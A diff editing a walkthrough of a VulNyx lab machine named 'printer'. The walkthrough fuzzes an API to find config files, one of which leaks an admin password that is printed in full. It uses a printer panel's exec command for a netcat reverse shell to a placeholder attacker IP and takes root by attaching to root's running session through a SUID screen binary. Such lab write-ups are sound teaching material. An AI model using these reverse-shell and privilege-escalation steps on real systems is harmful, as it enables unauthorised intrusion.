@@ -7,17 +7,18 @@
 | **Difficulty** | Easy |
 | **Creator** | `d4t4s3c` |
 | **Tools used** | `nmap` · `ffuf` · `wfuzz` · `curl` · `nc` |
+| **Tags** | `#IDOR` `#InfoDisclosure` `#RCE` `#SUID` `#SessionHijacking` |
 | **URL** | https://vulnyx.com/machines/ |
 
 An API endpoint serving per-printer config files is fuzzed for valid IDs, and one of the recovered files leaks an admin password for a printer's own management service on a custom port. That panel includes an `exec` command, giving straight command execution and a reverse shell. Root comes from a SUID `screen` binary — any user can attach directly into a root-owned session that was left running.
 
 ## Enumeration
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
-sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn printer.nyx
+$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn printer.nyx
 
 PORT     STATE  SERVICE  REASON
 22/tcp   open   ssh      syn-ack ttl 64
@@ -26,10 +27,10 @@ PORT     STATE  SERVICE  REASON
 MAC Address: 08:00:27:18:27:BB (Oracle VirtualBox virtual NIC)
 ```
 
-Three ports are found open: **22 (SSH)**, **80 (HTTP)**, and **9999** — not a standard port, worth investigating on its own. A version/script scan against all three fills in the details:
+Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **9999** — not a standard port, worth investigating on its own. A version and script scan on all three fills in the details:
 
 ```bash
-sudo nmap -p 22,80,9999 -sCV printer.nyx
+$ sudo nmap -p 22,80,9999 -sCV printer.nyx
 
 PORT     STATE  SERVICE  VERSION
 22/tcp   open   ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
@@ -51,6 +52,8 @@ minalServer, TerminalServerCookie, X11Probe:
 |_    Konica Minolta Printer Admin Panel
 ```
 
+Port 9999 introduces itself as a "Konica Minolta Printer Admin Panel" asking for a password — a lead to come back to once that password turns up.
+
 ### Web Enumeration
 
 The main page:
@@ -58,12 +61,13 @@ The main page:
 ```
 http://printer.nyx/
 ```
+
 <img src="../Images/printer/Pasted image 20260726204642.png"/>
 
-A recursive content discovery scan is run against the site:
+A recursive content discovery scan runs against the site:
 
 ```bash
-ffuf -u http://printer.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic --recursion
+$ ffuf -u http://printer.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic --recursion
 
 .php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3ms]
 index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 6ms]
@@ -71,52 +75,31 @@ index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Dura
                         [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 9ms]
 api                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 12ms]
 [INFO] Adding a new job to the queue: http://printer.nyx/api/FUZZ
-.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 9ms]
-.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 10ms]
-                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 18ms]
 server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 19ms]
 [INFO] Starting queued job on target: http://printer.nyx/api/FUZZ
 
-.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1ms]
-.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1ms]
 printers                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 18ms]
 [INFO] Adding a new job to the queue: http://printer.nyx/api/printers/FUZZ
-.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
-.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 13ms]
 [INFO] Starting queued job on target: http://printer.nyx/api/printers/FUZZ
 
-.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 2ms]
-.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 2ms]
 index.html              [Status: 200, Size: 303, Words: 16, Lines: 16, Duration: 2ms]
-.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3ms]
-.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 8ms]
-                        [Status: 200, Size: 303, Words: 16, Lines: 16, Duration: 22ms]
-                        [Status: 200, Size: 303, Words: 16, Lines: 16, Duration: 42ms]
 :: Progress: [882188/882188] :: Job [3/3] :: 4166 req/sec :: Duration: [0:04:13] :: Errors: 0 ::
 ```
+
+The recursion walks down to an `/api/printers/` endpoint:
 
 ```
 http://printer.nyx/api/printers/
 ```
+
 <img src="../Images/printer/Pasted image 20260726204752.png"/>
 
-## API Enumeration
+### API Enumeration
 
 The API looks like it serves per-printer config files by numeric ID, so `wfuzz` targets both the ID and the file extension at once:
 
 ```bash
-wfuzz -c --hc=404 -z range,1-5000 -z list,json-yml -u "http://printer.nyx/api/printers/printerFUZZ.FUZ2Z" 2>/dev/null
-```
-
-*(Insert the output from `20260726204836.png`)*
-
-The valid IDs found are pulled directly:
-
-```bash
-for i in 1 2 3 4 5 1599; do curl -sX GET "http://printer.nyx/api/printers/printer$i.json"; done
-
-┌──(kali㉿kali)-[~]
-└─$ wfuzz -c --hc=404 -z range,1-5000 -z list,json-yml -u "http://printer.nyx/api/printers/printerFUZZ.FUZ2Z" 2>/dev/null
+$ wfuzz -c --hc=404 -z range,1-5000 -z list,json-yml -u "http://printer.nyx/api/printers/printerFUZZ.FUZ2Z" 2>/dev/null
 
 Target: http://printer.nyx/api/printers/printerFUZZ.FUZ2Z
 
@@ -132,17 +115,25 @@ ID           Response   Lines    Word     Chars       Payload
 000003197:   200        6 L      9 W      97 Ch       "1599 - json"
 ```
 
+Six IDs come back valid — `1` through `5` and a stray `1599`. Pulling each config directly:
+
+```bash
+$ for i in 1 2 3 4 5 1599; do curl -sX GET "http://printer.nyx/api/printers/printer$i.json"; done
+```
+
 One of the config files leaks an admin password:
 
 > **Password:** `$3cUr3Pr1nT3RP4ZZw0rD`
 
-## Initial Access via the Printer Admin Panel
+## Initial Access
 
-Port 9999 turns out to be a management interface for the printer itself:
+### RCE via the Printer Admin Panel
+
+Port 9999 turns out to be a management interface for the printer itself, and the leaked password opens it:
 
 ```bash
-nc -vn 10.0.2.59 9999
-(UNKNOWN) [10.0.2.59] 9999 (?) open
+$ nc -v printer.nyx 9999
+printer.nyx [<IP_Victim>] 9999 (?) open
 
 Konica Minolta Printer Admin Panel
 
@@ -173,23 +164,23 @@ exec: execute system commands (exec id)
 exit: quit from telnet session
 ```
 
-Among its commands is `exec`, which runs an arbitrary command on the underlying host — used here to trigger a reverse shell instead of a one-off command:
+Among its commands is `exec`, which runs an arbitrary command on the underlying host — enough to fire a reverse shell instead of a one-off command:
 
 ```bash
-> exec busybox nc 10.0.2.15 9001 -e /bin/sh
+> exec busybox nc <ATTACKER_IP> <PORT> -e /bin/sh
 ```
 
 A listener catches the callback:
 
 ```bash
-nc -nlvp 9001
-listening on [any] 9001 ...
-connect to [10.0.2.15] from (UNKNOWN) [10.0.2.59] 34502
+$ nc -nlvp <PORT>
+listening on [any] <PORT> ...
+connect to [<ATTACKER_IP>] from (UNKNOWN) [printer.nyx] 34502
 id
 uid=1000(printer) gid=1000(printer) grupos=1000(printer)
 ```
 
-The shell is upgraded to something usable:
+A quick pty upgrade makes the shell usable:
 
 ```bash
 python3 -c 'import pty; pty.spawn ("/bin/bash")'
@@ -197,6 +188,8 @@ python3 -c 'import pty; pty.spawn ("/bin/bash")'
 stty raw -echo; fg
 export TERM=xterm
 ```
+
+### Shell as printer
 
 ```bash
 printer@printer:/var/spool/lpd$ ls -l /home
@@ -215,6 +208,8 @@ printer@printer:/var/spool/lpd$ cat /home/printer/user.txt
 
 ### SUID `screen` → Hijacking root's Session
 
+A search for SUID root binaries turns up one that doesn't belong: `screen`.
+
 ```bash
 printer@printer:/var/spool/lpd$ find / -uid 0 -perm -4000 -type f 2>/dev/null
 /usr/bin/mount
@@ -229,22 +224,22 @@ printer@printer:/var/spool/lpd$ find / -uid 0 -perm -4000 -type f 2>/dev/null
 /usr/lib/openssh/ssh-keysign
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
+
 ```bash
-printer@printer:/var/spool/lpd$ ls -l usr/bin/screen
+printer@printer:/var/spool/lpd$ ls -l /usr/bin/screen
 -rwsr-xr-x 1 root root 482312 feb 27  2021 /usr/bin/screen
 ```
 
-`screen` itself carries the SUID bit here. Normally, attaching to someone else's session (`screen -x`) is restricted by the permissions on its socket in `/run/screen` — but with `screen` running as root regardless of who invoked it, that restriction doesn't hold, and any user can attach directly into any other user's running session:
+`screen` carries the SUID bit here. Normally, attaching to someone else's session (`screen -x`) is restricted by the permissions on its socket in `/run/screen` — but with `screen` running as root regardless of who invoked it, that restriction doesn't hold, and any user can attach into any other user's running session. A quick look at the process table shows there's a root session to attach to (kept alive by a loop that respawns it whenever it's empty):
 
 ```bash
 printer@printer:/var/spool/lpd$ ps aux | grep "screen"
-root         413  0.0  0.0   2484   444 ?        Ss   20:25   0:00 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -emp
-ty -exec screen -dmS root \;; done
+root         413  0.0  0.0   2484   444 ?        Ss   20:25   0:00 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
 printer     20136  0.0  0.0   6252   700 pts/1    S+   20:42   0:00 grep screen
 printer@printer:/var/spool/lpd$ screen -x root/
 ```
 
-This drops straight into whatever `root`'s own screen session was doing:
+Attaching drops straight into whatever `root`'s own screen session was doing:
 
 ```bash
 root@printer:~# id
